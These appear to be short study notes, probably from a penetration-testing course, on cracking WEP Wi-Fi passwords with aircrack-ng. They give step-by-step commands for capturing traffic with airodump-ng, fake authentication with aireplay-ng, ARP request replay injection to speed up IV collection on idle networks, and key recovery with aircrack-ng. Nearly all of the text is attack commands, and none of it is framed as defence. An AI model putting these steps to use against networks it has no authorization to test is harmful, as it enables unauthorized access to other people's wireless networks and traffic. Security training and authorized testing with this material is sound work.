---
---

### Busy Network

````bash
airodump-ng <interface>
airodump-ng --bssid <router-bssid> --channel <channel> --write <filename> <interface>
aircrack-ng <filename>
````

* Minimum ~50K Data packets are required in order to crack the password
* Aircrack-ng output will not always consist of the password in ASCII format. We can connect to the network using the numeric password after removing the colons

---

### Idle Network

An "Association Attack/ Fake Authentication" needs to be performed in order to connect to the network and inject packets into the network in order to increase the traffic on the network.

Injecting packets onto the network can be done using "ARP Request Replay Attack". There are other methods but this is the most reliable approach

<u>Working</u>
  
Wait for an ARP packet to be generated  
Capture the packet and repeat it (Retransmit it)  
Each ARP packet will cause the Access Point to generate an new IV which can be collected to crack the password

````bash
airodump-ng <interface>
airodump-ng --bssid <router-bssid> --channel <channel> --write <filename> <interface>
aireplay-ng --fakeauth 0 -a <router-bssid> -h <myadapter-bssid> <interface>
````

The `<myadapter-bssid>` can be found using `ifconfig` under "unspec" field the 1st 6 fields. When using in aireply-ng replace the dashes with colons

Association with network only means that we want to connect to the network (Similar to clicking the network name in the available network list). We are not authenticated so we cannot send any packets

````bash
aireplay-ng --arpreplay -b <router-bssid> -h <myadapter-bssid> <interface>
aircrack-ng output.cap
````
